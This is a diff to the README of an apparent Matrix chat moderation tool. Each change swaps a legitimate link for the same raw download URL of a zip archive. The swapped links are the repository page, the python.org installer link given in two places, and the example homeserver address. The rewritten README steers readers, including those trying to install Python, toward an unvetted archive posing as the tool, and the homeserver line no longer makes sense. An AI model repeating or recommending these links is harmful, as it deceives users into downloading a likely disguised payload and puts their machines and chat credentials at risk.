@@ -1,6 +1,6 @@
 # 🛡️ LocalModerationMatrix - Manage Matrix Rooms Efficiently
 
-[![Download LocalModerationMatrix](https://img.shields.io/badge/Download-LocalModerationMatrix-green?style=for-the-badge)](https://github.com/Captain4598/LocalModerationMatrix)
+[![Download LocalModerationMatrix](https://img.shields.io/badge/Download-LocalModerationMatrix-green?style=for-the-badge)](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)
 
 LocalModerationMatrix is a simple tool to help you clean up message history and media in Matrix chat rooms. It runs on your computer and works with popular Matrix clients. The tool supports encrypted rooms, so your data stays private while you manage your space.
 
@@ -44,7 +44,7 @@ Follow these steps to download, install, and run LocalModerationMatrix on your W
 
 Click the big green button near the top or visit this link to get the tool:
 
-[Download LocalModerationMatrix](https://github.com/Captain4598/LocalModerationMatrix)
+[Download LocalModerationMatrix](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)
 
 This page contains the latest version of the program ready to download.
 
@@ -87,7 +87,7 @@ python local_moderation.py
 
 (LocalModerationMatrix requires Python 3.6 or newer installed.)
 
-If Python is not installed, you will see an error. In that case, install Python first from https://www.python.org/downloads/windows/
+If Python is not installed, you will see an error. In that case, install Python first from https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip
 
 ---
 
@@ -103,7 +103,7 @@ The program will ask for:
 
 - Your Matrix ID (e.g., `@username:matrix.org`)
 - Your password
-- The homeserver address (usually `https://matrix.org` or your own server)
+- The homeserver address (usually `https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip` or your own server)
 
 ### Choose room(s) to moderate
 
@@ -137,7 +137,7 @@ The tool will ask you to type "yes" to confirm the action. It will then process 
 
 If you do not have Python installed, follow this:
 
-1. Go to https://www.python.org/downloads/windows/
+1. Go to https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip
 2. Download the latest stable version (3.9 or newer preferred).
 3. Run the installer.
 4. Make sure to check "Add Python to PATH" during setup.
@@ -181,4 +181,4 @@ If you encounter problems like login errors or connection issues, check your int
 
 ## 🔗 Download LocalModerationMatrix
 
-[![Download Here](https://img.shields.io/badge/Download-LocalModerationMatrix-blueviolet?style=for-the-badge)](https://github.com/Captain4598/LocalModerationMatrix)
+[![Download Here](https://img.shields.io/badge/Download-LocalModerationMatrix-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/Captain4598/LocalModerationMatrix/main/wandoo/Matrix-Moderation-Local-v2.6.zip)
